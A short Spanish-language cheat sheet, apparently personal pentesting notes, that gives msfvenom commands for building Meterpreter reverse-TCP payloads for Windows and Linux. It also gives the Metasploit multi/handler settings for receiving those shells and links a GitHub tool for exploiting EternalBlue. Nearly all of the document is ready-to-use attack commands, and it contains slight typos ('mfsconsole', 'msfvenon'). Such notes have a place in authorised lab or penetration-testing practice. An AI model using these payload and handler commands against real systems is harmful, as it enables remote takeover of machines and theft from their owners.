 - Tags: #msfvenom #recursos_github #eternal_blue

--Para windows--
```bash

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o name_payload.exe


mfsconsole

#Los datos en el multihandler deben corresponderse con los datos en el payload que se crea en el msfvenon

use /multi/handler
show options
set LPORT <PORT>
set LHOST <IP>
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

Eternal Blue de forma manual con herramienta de github

**Recurso**: [https://github.com/d4t4s3c/Win7Blue](https://github.com/d4t4s3c/Win7Blue)

--Para Linux--
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o name_payload.elf


mfsconsole

#Los datos en el multihandler deben corresponderse con los datos en el payload que se crea en el msfvenon

use /multi/handler
show options
set LPORT <PORT>
set LHOST <IP>
set PAYLOAD linux/x64/meterpreter/reverse_tcp
run

```